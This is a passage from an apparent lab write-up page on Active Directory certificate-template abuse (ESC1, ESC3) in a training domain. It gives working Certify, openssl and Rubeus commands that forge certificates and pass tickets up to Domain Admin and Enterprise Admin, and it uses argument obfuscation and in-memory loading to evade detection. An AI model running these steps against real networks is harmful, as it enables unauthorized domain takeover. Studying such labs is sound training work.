+<p>Now let’s copy all the text between -----BEGIN RSA PRIVATE KEY----- and -----END CERTIFICATE----- and save it to ESC1.pem</p>
+<p>We need to convert it to PFX to use it. Use openssl binary on the student VM to do that. I will use MrStark123 as the export password</p>
+<p>C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\ESC1.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\ESC1-Enterprise_Admin.pfx</p>
+
+<h3>Using PELoader.exe for args encoding.</h3>
+
+
+<p>Back to cmdlet, PELoader.exe is a tool used to load a payload into memory. So I’ll use PELoader.exe now to load and execute Rubeus.exe into memory. Pay attention that if we are using PELoader.exe to load payloads into memory only. It is also good that we execute ArgSplit.bat first to encode parameters of Rubeus, SafetyKatz and BetterSafetyKatz.</p>
+
+<p>ArgSplit.bat</p>
+<p>asktgt</p>
+<pre><code>[!] Argument Limit: 180 characters
+[+] Enter a string: asktgt
+set "z=t"
+set "y=g"
+set "x=t"
+set "w=k"
+set "v=s"
+set "u=a"
+set "Pwn=%u%%v%%w%%x%%y%%z%"</code></pre>
+
+
+<p>Now let’s use PFX created  with Rubeus to request a TGT for Enterprise Admin - Administrator!</p>
+<p>C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args %Pwn% /user:moneycorp.local\Administrator /dc:mcorp-dc.moneycorp.local /certificate:ESC1-Enterprise_Admin.pfx /password:MrStark123 /ptt</p>
+
+<p>Now, finally we were able to  escalate privilege from domain admin to Enterprise Admin.</p>
+<p>we can now access moneycorp.local domain controller.</p>
+<p>winrs -r:mcorp-dc cmd</p>
+
+
+
+
+<h1>Privilege Escalation to Domain Admin and Enterprise Admin using ESC3</h1>
+
+
+<p>using Certify.exe we can also use the flag /vulnerable to enumerate templates in moneycorp.local.</p>
+<p>certify.exe find /vulnerable</p>
+<img src="./images/screenshot_156.png" alt="">
+
+
+<p>The "SmartCardEnrollment-Agent" template has EKU(ExtendedKetUsage) for Certificate Request Agent and grants enrollment rights to Domain users. </p>
+<p>If we can find another template that has an EKU(ExtendedKeyUsage) that allows for domain authentication and has application policy requirement of certificate request agent, we can request certificate on behalf of any user.</p>
+
+<p>With the command below we are able to find the perfect template we are looking for.</p>
+<p>Certify.exe find</p>
+<pre><code> CA Name                               : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
+    Template Name                         : SmartCardEnrollment-Users
+    Schema Version                        : 2
+    Validity Period                       : 10 years
+    Renewal Period                        : 6 weeks
+    msPKI-Certificates-Name-Flag          : SUBJECT_ALT_REQUIRE_UPN, SUBJECT_REQUIRE_DIRECTORY_PATH
+    mspki-enrollment-flag                 : AUTO_ENROLLMENT
+    Authorized Signatures Required        : 1
+    Application Policies                  : Certificate Request Agent
+    pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Secure Email
+    mspki-certificate-application-policy  : Client Authentication, Encrypting File System, Secure Email
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights           : dcorp\Domain Users            S-1-5-21-719815819-3726368948-3917688648-513
+                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+      Object Control Permissions
+        Owner                       : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
+        WriteOwner Principals       : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
+                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+        WriteDacl Principals        : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
+                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+        WriteProperty Principals    : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
+                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519</code></pre>
+
+
+<p>We were able to find the perfect template with the perfect sets we were looking for. As we can see above, we have what we were looking </p>
+<p>Template Name: SmartCardEnrollment-Users</p>
+<p>Application Policies: Certificate Request Agent</p>
+<p>Enrollment Rights: dcorp\Domain Users</p>
+
+<p>That great. Now let’s request an Enrollment Agent Certificate from the template "SmartCardEnrollment-Agent".</p>
+<p>C:\AD\Tools\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:SmartCardEnrollment-Agent</p>
+<img src="./images/screenshot_157.png" alt="">
+
+
+<p>Now let’s copy all the text between -----BEGIN RSA PRIVATE KEY----- and -----END CERTIFICATE----- and save it to ESC1.pem</p>
+<p>We need to convert it to PFX to use it. I will use MrStark123 as the export password</p>
+<p>C:\AD\Tools\openssl\openssl.exe pkcs12 -in ESC3.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out ESC3-Agent.pfx</p>
+
+<p>Now we can use the Enrollment Agent Certificate to request a certificate for DA from the template SmartCardEnrollment-Users</p>
+<p>C:\AD\Tools\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:SmartCardEnrollment-Users /onbehalfof:dcorp\administrator /enrollcert:C:\AD\Tools\ESC3-Agent.pfx /enrollcertpw:MrStark123</p>
+<img src="./images/screenshot_158.png" alt="">
+
+
+<p>Once again, save the certificate text to ESC3_Domain-Admin.pem and convert the pem to pfx. Still using MrStark123 as the export password.</p>
+<p>C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\esc3-Domain_Admin.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\esc3-Domain_Admin.pfx</p>
+<h3>Using PELoader.exe for args encoding.</h3>
+
+
+<p>Back to cmdlet, PELoader.exe is a tool used to load a payload into memory. So I’ll use PELoader.exe now to load and execute Rubeus.exe into memory. Pay attention that if we are using PELoader.exe to load payloads into memory only. It is also good that we execute ArgSplit.bat first to encode parameters of Rubeus, SafetyKatz and BetterSafetyKatz.</p>
+
+<p>ArgSplit.bat</p>
+<p>asktgt</p>
+<pre><code>[!] Argument Limit: 180 characters
+[+] Enter a string: asktgt
+set "z=t"
+set "y=g"
+set "x=t"
+set "w=k"
+set "v=s"
+set "u=a"
+set "Pwn=%u%%v%%w%%x%%y%%z%"</code></pre>
+
+
+<p>Now let’s use the ESC3-Domain_Admin.pem created above with Rubeus to request a TGT for Domain Admin.</p>
+<p>C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args %Pwn% /user:Administrator /certificate:esc3-Domain_Admin.pfx /password:MrStark123 /ptt</p>
+<img src="./images/screenshot_159.png" alt="">
+
+
+<p>As we can seen from the output above, the ticket has been successfully imported into our Cached Tickets, let’s enumerate it using klist command. </p>
+<p>klist</p>
+<img src="./images/screenshot_160.png" alt="">
+
+
+<p>Yes the ticket has been imported, now we can access Domain Controller as Domain Admin.</p>
+<p>winrs -r:dcorp-dc cmd</p>
+<img src="./images/screenshot_161.png" alt="">
+
+
+<p>We were able to privilege escalate to Domain Admin.</p>
+
+
+<p>To escalate to Enterprise Admin, we just need to make changes to request to the SmartCardEnrollment-Users template and Rubeus. </p>
+<p>Please note that we are using '/onbehalfof: mcorp\administrator' here.</p>
+
+<p>C:\AD\Tools\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:SmartCardEnrollment-Users /onbehalfof:mcorp\administrator /enrollcert:C:\AD\Tools\ESC3-Agent.pfx /enrollcertpw:MrStark123</p>
+
+<p>After we Convert the pem to ESC3-Enterprise_Admin.pfx using openssl with password MrStark123 and use the pfx with Rubeus</p>
+<p>C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\ESC3-Enterprise_Admin.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\ESC3-Enterprise_Admin.pfx</p>
+<h3>Using PELoader.exe for args encoding.</h3>
+
+
+<p>Back to cmdlet, PELoader.exe is a tool used to load a payload into memory. So I’ll use PELoader.exe now to load and execute Rubeus.exe into memory. Pay attention that if we are using PELoader.exe to load payloads into memory only. It is also good that we execute ArgSplit.bat first to encode parameters of Rubeus, SafetyKatz and BetterSafetyKatz.</p>
+
+<p>ArgSplit.bat</p>
+<p>asktgt</p>
+<pre><code>[!] Argument Limit: 180 characters
+[+] Enter a string: asktgt
+set "z=t"
+set "y=g"
+set "x=t"
+set "w=k"
+set "v=s"
+set "u=a"
+set "Pwn=%u%%v%%w%%x%%y%%z%"</code></pre>
+
+
+<p>Now let’s use PFX created  with Rubeus to request a TGT for Enterprise Admin - Administrator!</p>
+<p>C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args %Pwn% /user:moneycorp.local\administrator /certificate:C:\AD\Tools\ESC3-Enterprise_Admin.pfx /dc:mcorp-dc.moneycorp.local /password:MrStark123 /ptt</p>
+
+<p>Voila we were able to get Enterprise Admin privilege escalation. We can access domain controller using winrs.</p>
+<p>winrs -r:mcorp-dc cmd</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div style="margin-top: 40px; padding-top: 20px; border-top: 1px solid var(--jet); display: flex; justify-content: space-between;">
+  <a href="part-18-crossforest-trust.html" style="color: var(--orange-yellow-crayola); text-decoration: none;">&larr; Previous: Part 18</a>
+  <a href="part-20-trust-links.html" style="color: var(--orange-yellow-crayola); text-decoration: none;">Next: Part 20 &rarr;</a>
+</div>
+
+        </section>
+
+      </article>
+
+    </div>
+
+  </main>
+
+  <script src="../assets/js/script.js"></script>
+  <script type="module" src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.esm.js"></script>
+  <script nomodule src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.js"></script>
+
+</body>
+
+</html>
